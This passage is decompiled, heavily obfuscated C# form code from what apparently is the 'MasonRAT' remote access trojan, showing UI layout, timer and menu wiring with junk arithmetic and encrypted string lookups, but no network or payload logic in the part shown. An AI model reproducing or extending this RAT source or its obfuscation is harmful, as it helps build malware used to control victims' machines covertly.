    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.CustomBorderColor = Color.FromArgb((1033955424 - 1033955386 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) ^ 9957592 - 9957569 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, ((1722256121 ^ (1687567279 | 433673382)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) - (524638336 - 63726427 % 653295244 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) % ((2104661399 > 1364649819 ? 1414465594 : 1885954125) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, (2141699014 - (1979949949 | 463976706) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 ^ 712157497 - 712157475 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.FillColor = Color.FromArgb((1486262546 + (1037144618 << 51638769) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0 > (1712042805 ^ 1016636493 % 2085634920) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) ? (368184630 > 775173639 ? 65 : 49) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) : (-1654198477 ^ ~1654198413) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, (-1821472065 - 1198426766 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ (1823634554 > 979471797 ? 1038375827 : 1384501102) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1) << 1788885612 + (1846275822 >> 697771268) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, (1955211301 + 347658359 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) + (1396090888 + 484069916 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0) | (381480554 ^ 1610373099 >> 1537561875) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2278), 15.75f, FontStyle.Regular, (GraphicsUnit) ((-529843831 - 600521094 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) + (-392062898 - 1925162008 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << ((-474355163 ^ ~99562478) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0), (byte) 0);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.Location = new Point((-983542974 ^ 983446310 % 2079697310) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) + ((1743352988 + (50959337 >> 552990359) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) >> ((1558729926 | 1795539465) - 279541345 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, 44);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2279);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.ShadowDecoration.Enabled = true;
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.Size = new Size((500919502 + (198773501 << 1638883327) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) - ~(~1655971725 - 992430793 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, 510);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.TabIndex = ((1412823698 ^ 16 /*0x10*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) > 781785777 - 674570449 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) ? (1770222692 > 205758137 ? 14 : 18) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0 : 2121580772 - 2121580754 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0;
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2280);
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.Anchor = (AnchorStyles) (((1683115944 ^ 1704480596 << 195032576) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) - ((1523527473 > 2097193570 ? 1280671194 : 960503396) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) >> (-1054021380 - 1637140311 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0);
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.Animated = true;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.Cursor = Cursors.Hand;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.CustomIconSize = 30f;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.HoverState.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.HoverState.IconColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.IconColor = Color.White;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.Location = new Point((987937175 > 1257398803 ? 171388682 : 128541512) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 - (-1120676799 - 1696770968 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) % (390999148 + 957979462 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, 2);
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2281);
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.PressedColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.PressedDepth = 0;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.Size = new Size(((45 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1) ^ (1051770591 >> 160097925) - 32867815 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 37);
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.TabIndex = (~246173252 - 559133113 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) ^ (425928735 ^ 5) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << (1563034507 - (1448363524 << 714379650) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0;
    this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ.UseTransparentBackground = true;
    this.\u2694️MasonRAT\u270C\u060Eدٸټ\u060Eـا\u060F\u0608ـ\u0608̨ۜۙ.DockIndicatorTransparencyValue = 0.6;
    this.\u2694️MasonRAT\u270C\u060Eدٸټ\u060Eـا\u060F\u0608ـ\u0608̨ۜۙ.TargetControl = (Control) this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609;
    this.\u2694️MasonRAT\u270C\u060Eدٸټ\u060Eـا\u060F\u0608ـ\u0608̨ۜۙ.UseTransparentDrag = true;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.Black;
    this.ClientSize = new Size(51075544 + 2065983148 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - (216951420 + 1295598078 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0 | 1772836620 - 897687884 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, 567);
    this.Controls.Add((Control) this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609);
    this.FormBorderStyle = FormBorderStyle.None;
    this.Icon = (Icon) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2282));
    this.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2283);
    this.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2284);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cـ\u060Dڜۙـﮪڕ\u060F\u060B\u060D\u060A.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.PerformLayout();
    this.ResumeLayout(false);
  }

  [field: AccessedThroughProperty("TextBox1")]
  internal virtual TextBox \u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Timer \u2694️MasonRAT\u270C\u060Aگـڝـ\u060Bــ\u0608\u0608ۡ̍\u060Aڙ\u0608ـڙ
  {
    get => this.\u2694️MasonRAT\u270Cڜـبـּٺ\u060Cـاـ\u0608ٺڜٺـڙـ\u060Aـﻼ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C̍ـٸٽؤٽ̍\u060F\u060A\u0608ڝٺ\u060Bٺۚ);
      Timer ڜـبـּٺـاـٺڜٺـڙــﻼ1 = this.\u2694️MasonRAT\u270Cڜـبـּٺ\u060Cـاـ\u0608ٺڜٺـڙـ\u060Aـﻼ;
      if (ڜـبـּٺـاـٺڜٺـڙــﻼ1 != null)
        ڜـبـּٺـاـٺڜٺـڙــﻼ1.Tick -= eventHandler;
      this.\u2694️MasonRAT\u270Cڜـبـּٺ\u060Cـاـ\u0608ٺڜٺـڙـ\u060Aـﻼ = value;
      Timer ڜـبـּٺـاـٺڜٺـڙــﻼ2 = this.\u2694️MasonRAT\u270Cڜـبـּٺ\u060Cـاـ\u0608ٺڜٺـڙـ\u060Aـﻼ;
      if (ڜـبـּٺـاـٺڜٺـڙــﻼ2 == null)
        return;
      ڜـبـּٺـاـٺڜٺـڙــﻼ2.Tick += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ContextMenuStrip1")]
  internal virtual ContextMenuStrip \u2694️MasonRAT\u270Cـ\u060Dڜۙـﮪڕ\u060F\u060B\u060D\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cبٺ\u060D\u060Fۏ\u060D̍ــمﻻڙـ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060Eڙ\u060Fىــٸةۡح\u060Aؤ\u060Aۙد\u060A\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609\u060Aؤـ\u0609\u0609حڛـۭــ\u060A\u060Aـ\u060A);
      ToolStripMenuItem masonRatـڙىــٸةۡحؤۙد1 = this.\u2694️MasonRAT\u270Cـ\u060Eڙ\u060Fىــٸةۡح\u060Aؤ\u060Aۙد\u060A\u060A;
      if (masonRatـڙىــٸةۡحؤۙد1 != null)
        masonRatـڙىــٸةۡحؤۙد1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060Eڙ\u060Fىــٸةۡح\u060Aؤ\u060Aۙد\u060A\u060A = value;
      ToolStripMenuItem masonRatـڙىــٸةۡحؤۙد2 = this.\u2694️MasonRAT\u270Cـ\u060Eڙ\u060Fىــٸةۡح\u060Aؤ\u060Aۙد\u060A\u060A;
      if (masonRatـڙىــٸةۡحؤۙد2 == null)
        return;
      masonRatـڙىــٸةۡحؤۙد2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Bڛــﮪبڟدټ\u060E\u060D\u060D
  {
    get => this.\u2694️MasonRAT\u270C\u0609\u060Cڼۧ\u0608\u0609\u060Bٺٸ̍ڼـ\u0609\u060E\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـڝ\u0608\u060Dـﻋ\u0608ۙ\u0608\u060A\u0609ﻋ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u0609\u060Cڼۧ\u0608\u0609\u060Bٺٸ̍ڼـ\u0609\u060E\u060A;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609\u060Cڼۧ\u0608\u0609\u060Bٺٸ̍ڼـ\u0609\u060E\u060A = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u0609\u060Cڼۧ\u0608\u0609\u060Bٺٸ̍ڼـ\u0609\u060E\u060A;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٺۭ\u060Dـﻋـ\u0020ــٺ\u060F\u060Aد\u0609ا\u060Fحـــ
  {
    get => this.\u2694️MasonRAT\u270Cـةـ\u0608\u060Dـٽۜب\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڦـﻻگ؁ــ\u0608ﻼــڅ\u0609\u0608ـ\u060Bٺ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cـةـ\u0608\u060Dـٽۜب\u0608;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـةـ\u0608\u060Dـٽۜب\u0608 = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cـةـ\u0608\u060Dـٽۜب\u0608;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2Elipse1")]
  internal virtual Guna2Elipse \u2694️MasonRAT\u270Cـ\u0609ـئـۡٺټ\u0609\u0609ڙڛڝ\u060D { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2CustomGradientPanel2")]
  internal virtual Guna2CustomGradientPanel \u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2ControlBox2")]
  internal virtual Guna2ControlBox \u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2ControlBox1")]
  internal virtual Guna2ControlBox \u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2GroupBox1")]
  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2DragControl1")]
  internal virtual Guna2DragControl \u2694️MasonRAT\u270C\u060Eدٸټ\u060Eـا\u060F\u0608ـ\u0608̨ۜۙ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2ContextMenuStrip1")]
